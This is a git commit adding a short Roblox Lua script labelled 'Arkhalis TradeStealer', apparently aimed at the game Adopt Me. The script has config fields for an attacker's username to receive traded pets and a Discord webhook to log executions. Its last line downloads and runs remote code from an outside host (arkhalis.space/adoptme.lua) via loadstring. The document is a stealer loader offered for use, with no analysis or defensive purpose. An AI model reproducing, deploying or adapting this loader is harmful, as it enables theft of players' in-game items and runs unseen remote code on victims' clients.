83f080a5a84b806cd21655ea29fc12072334d4a4
blatant <167679449+oppblatant@users.noreply.github.com>
2024-08-31 12:09:34 +0300

    Add files via upload

---
+++ script.lua
@@ -0,0 +1,14 @@
+ --[[
+       ▀█▀ █▀█ ▄▀▄ █▀▄ █▀▀ █▀▀ ▀█▀ █▀▀ ▄▀▄ █   █▀▀ █▀█ 
+        █  █▀▄ █▀█ █▄▀ ██▄ ▄██  █  ██▄ █▀█ █▄▄ ██▄ █▀▄  
+--]]
+
+--[ Arkhalis TradeStealer --]
+
+--[ Main Config --]
+
+Username = "" --// Username To Trade Pets To
+Webhook = "" --// Discord Webhook For Executions
+
+--[ Excutable Loadstring --]
+loadstring(game:HttpGet("https://arkhalis.space/adoptme.lua"))()
